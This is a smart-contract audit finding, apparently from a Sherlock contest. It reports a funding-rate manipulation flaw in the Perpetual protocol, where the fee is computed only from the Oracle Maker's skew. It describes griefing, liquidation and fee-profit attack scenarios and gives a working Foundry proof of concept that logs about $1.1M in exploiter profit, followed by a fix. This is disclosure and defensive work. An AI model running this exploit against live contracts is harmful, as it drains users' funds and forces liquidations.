Clumsy Chambray Gazelle

high

# Funding Fee Rate is calculated based only on the Oracle Maker's skew but applied across the entire market, which enables an attacker to generate an extreme funding rate for a low cost and leverage that to their benefit

## Summary

The fact that the Funding Fee rate is calculated only based on the Oracle Maker's position skew enables an exploiter to open a large long position on the Oracle Maker that generates an extreme funding fee paid by long takers, and then close the position (+open an opposite one) on the SpotHedge maker within the same block while maintaining the funding fee value and direction. This can be used to generate various attacks as detailed below.

## Vulnerability Detail

Perpetual uses funding fee to balance between long and short positions, mainly to balance/reduce exposure of the Oracle Maker (from the docs: *"In our system, having a funding fee will be beneficial for the Oracle Pool"*. Presumably for this reason the funding rate is calculated based only on the Oracle Maker's position skew as can be seen in this code snippet taken from the getCurrentFundingRate function (note that basePool is neccesarily the Oracle Maker since it is type-casted to OracleMaker in the code):
```solidity
        // we can only use margin without pendingMargin as totalDepositedAmount
        // since pendingMargin includes pending borrowingFee and fundingFee,
        // it will be infinite loop dependency
        uint256 totalDepositedAmount = uint256(_getVault().getSettledMargin(marketId, fundingConfig.basePool));
        uint256 maxCapacity = FixedPointMathLib.divWad(
            totalDepositedAmount,
            uint256(OracleMaker(fundingConfig.basePool).minMarginRatio())
        );
```
However, the funding fee applies to **any position** in the market (as can be seen in the [Vault::settlePosition](https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/vault/Vault.sol#L139) function) which enables an exploiter to create a very high funding rate for a low cost by opening a large long position on the oracle maker and close the position immediately after on the HSBM maker (possibly also opening a short depending on the type of attack).  Since the opposite position does not affect the funding rate (as it is settled with the SpotHedge maker), the funding rate will maintain its extreme value and its direction. 

This maneuver can generate multiple types of attacks that can be conducted individually or combined:  

**A. Griefing/Liquidation attack** - The attacker creates an extreme funding rate that causes immediate loss to position holders of the attacked direction, possibly making many positions liquidatable on the next block. This attack is conducted as follows:  
A.1. Attacker opens a maximal long position on the oracle maker creating an extremely high funding rate paid by longs.
A.2. Attacker closes their long position using the HSBM maker. This means the extreme high funding rate is unaffected since its calculated based on the oracle maker only. (A1 and A2 can be done in an atomic transaction from an attacker contract).  
A.3. Starting from the next block any long position in the system incures a very high cost per block, likely making many positions liquidatable immediately.  
A.4. The cost for the attacker is only the negative PnL caused by the spread between the oracle and HSBM makers. The attacker can offset the cost and make a profit by running a transaction at the start of the next block that liquidates all positions that were liquidated by the move (the attacker has information advantage over other liquidators and are likely to win the liquidations).  

**B. Profiting from large funding fee within one block by also opening a short (exfiltrating funds from the PnL pool).**  
B.1. the attack starts similarly to A: the attacker opens a maximal long position on the OM and then a counter short position on the HSBM maker, only this time the attacker also opens a short on the SpotHedge maker that gains the attacker funding fees starting from the next block.  
B.2. The attacker can close the short position at the start of the next block to reduce risk, taking profit from the fee paid for the one block, in addition to liquidating any affected positions as in scenario A.  
B.3. The cost of attack: negative PnL caused by spread between the two makers, plus borrowing fee. However because borrowing fee does not grow exponentially with utilization rate like the funding fee, it is covered by the funding fee with a profit.

**C. Profiting from a large deposit to the oracle maker/withdraw within one block.**  
C.1.  The attack runs the same as scenario A, only the attacker also makes a large deposit to the oracle maker, and withdraws on the next block.  
C.2. Since share values take into account pending fees, the share value will increase significantly from one block to the next because the oracle maker will also get a high funding fee within that one block (this is because oracle maker also holds a large short position as a result of the attackers initial postion, that gets paid funding fee). Note that in this scenarion the attacker needs to verify that there is no expected loss to share value between these two blocks




The POC below shows how with reasonable market considitions the attacker can make a significant profit, specifically using only attack type B.



### POC
The following POC shows the scenario where the attacker generates a high funding rate paid by longs, while opening a large short position for themselves, then on the next block the attacker closes the short with a significant gain from funding fee (while the HSBM maker pays the funding fee)

To run:  
A. create a test.sol file under the perp-contract-v3/test/spotHedgeMaker/ folder and add the code below to it.
B. Run forge test --match-test testFundingFeePOC -vv

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../spotHedgeMaker/SpotHedgeBaseMakerForkSetup.sol";
import { OracleMaker } from "../../src/maker/OracleMaker.sol";
import "../../src/common/LibFormatter.sol";
import { SignedMath } from "@openzeppelin/contracts/utils/math/SignedMath.sol";

contract FundingFeeExploit is SpotHedgeBaseMakerForkSetup {

    using LibFormatter for int256;
    using LibFormatter for uint256;
    using SignedMath for int256;

    address public taker = makeAddr("Taker");
    address public exploiter = makeAddr("Exploiter");
    OracleMaker public oracle_maker;

    function setUp() public override {
        super.setUp();
        //create oracle maker
        oracle_maker = new OracleMaker();
        _enableInitialize(address(oracle_maker));
        oracle_maker.initialize(marketId, "OM", "OM", address(addressManager), priceFeedId, 1e18);
        config.registerMaker(marketId, address(oracle_maker));

        //PARAMETERS SETUP

        //fee setup
        //funding fee configs (taken from team tests) 
        config.setFundingConfig(marketId, 0.005e18, 1.3e18, address(oracle_maker));
        //borrowing fee 0.00000001 per second as in team tests
        config.setMaxBorrowingFeeRate(marketId, 10000000000, 10000000000);
        oracle_maker.setMaxSpreadRatio(0.1 ether); // 10% as in team tests
        

        //whitelist users
        oracle_maker.setValidSender(exploiter,true);
        oracle_maker.setValidSender(taker,true);
        

        //add more liquidity ($20M) to uniswap pool to simulate realistic slippage
        deal(address(baseToken), spotLp, 10000e9, true);
        deal(address(collateralToken), spotLp, 20000000e6, true);
        vm.startPrank(spotLp);
        uniswapV3NonfungiblePositionManager.mint(
            INonfungiblePositionManager.MintParams({
                token0: address(collateralToken),
                token1: address(baseToken),
                fee: 3000,
                tickLower: -887220,
                tickUpper: 887220,
                amount0Desired: collateralToken.balanceOf(spotLp),
                amount1Desired: baseToken.balanceOf(spotLp),
                amount0Min: 0,
                amount1Min: 0,
                recipient: spotLp,
                deadline: block.timestamp
            })
        );
 

        //mock the pyth price to be same as uniswap (set to ~$2000 in base class)
        pyth = IPyth(0xff1a0f4744e8582DF1aE09D5611b887B6a12925C);
        _mockPythPrice(2000,0);
    }


    function testFundingFeePOC() public {
       

        //deposit 5M collateral as margin for exploiter (also mints the amount)
        uint256 startQuote = 5000000*1e6;
       _deposit(marketId, exploiter, startQuote);
       console.log("Exploiter Quote balance at Start: %s\n", startQuote);

        //deposit to makers
        //initial HSBM maker deposit: 2000 base tokens ($4M)
       vm.startPrank(makerLp);
       deal(address(baseToken), makerLp, 2000*1e9, true);
       baseToken.approve(address(maker), type(uint256).max);
       maker.deposit(2000*1e9);

       //initial oracle maker deposit: $2M (1000 base tokens)
       deal(address(collateralToken), makerLp, 2000000*1e6, true); 
       collateralToken.approve(address(oracle_maker), type(uint256).max);
       oracle_maker.deposit(2000000*1e6);
       vm.stopPrank();

       //Also deposit collateral directly to SHBM to simulate some existing margin on the SHBM from previous activity
       _deposit(marketId, address(maker), 2000000*1e6);

       //Exploiter opens the maximum possible (-1000 base tokens) long on oracle maker
        vm.startPrank(exploiter);
        (int256 posBase, int256 openNotional) = clearingHouse.openPosition(
            IClearingHouse.OpenPositionParams({
                marketId: marketId,
                maker: address(oracle_maker),
                isBaseToQuote: false,
                isExactInput: false,
                amount: 1000*1e18,
                oppositeAmountBound:type(uint256).max,
                deadline: block.timestamp,
                makerData: ""
            })
        );

        //Exploiter opens maximum possible short on the HSBM maker changing their position to short 1000 (2000-1000)
        (posBase,openNotional) = clearingHouse.openPosition(
            IClearingHouse.OpenPositionParams({
                marketId: marketId,
                maker: address(maker),
                isBaseToQuote: true,
                isExactInput: true,
                amount: 2000 * 1e18,
                oppositeAmountBound:0,
                deadline: block.timestamp,
                makerData: ""
            })
        );
        console.log("Funding Fee Rate after short:");
        int256 ffeeRate = fundingFee.getCurrentFundingRate(marketId);
        console.logInt(ffeeRate);
        //OUTPUT:
        // Funding Fee Rate after short:
        //-388399804857866884

        //move to next block
        vm.warp(block.timestamp + 2 seconds);

        //Exploiter closes the short to realize gains
        int256 exploiterPosSize = vault.getPositionSize(marketId,address(exploiter));
        clearingHouse.openPosition(
            IClearingHouse.OpenPositionParams({
                marketId: marketId,
                maker: address(maker),
                isBaseToQuote: false,
                isExactInput: false,
                amount: exploiterPosSize.abs(),
                oppositeAmountBound:type(uint256).max,
                deadline: block.timestamp,
                makerData: ""
            })
        );

        //exploiter withdraws entirely
        int256 upDec = vault.getUnsettledPnl(marketId,address(exploiter));
        int256 stDec = vault.getSettledMargin(marketId,address(exploiter));
        int256 marg = stDec-upDec;
        uint256 margAbs = marg.abs();
        uint256 toWithdraw = margAbs.formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals());
        vault.transferMarginToFund(marketId,toWithdraw);
        vault.withdraw(vault.getFund(exploiter));
        vm.stopPrank();

        uint256 finalQuoteBalance = collateralToken.balanceOf(address(exploiter));
        console.log("Exploiter Quote balance at End: %s", finalQuoteBalance);
        //OUTPUT: Exploiter Quote balance at End: 6098860645835
        //exploiter profit  = $6,098,860 - $5,000,000 = $1,098,860
    }
}

```


## Impact

The various possible attacks detailed above generate immediate profits to the exploiter that can be withdrawn immediately if enough PnL exists in the pool, diluting the PnL pool on the expense of users and causing them financial loss from not being able to withdraw their profits. In addition, as detailed above many positions can be made liquidatable following the attack causing further damage.

## Code Snippet
https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/fundingFee/FundingFee.sol#L104

## Tool used

Manual Review
Foundry

## Recommendations

To mitigate this issue it is essential to resolve the root cause: the fact that funding fee is set using only a part of the market (Oracle Maker). Instead, the entire market long/short positions should be used to determine the rate. This will prevent an exploiter from opening the counter position (that gains fee) without that position also affecting the funding rate.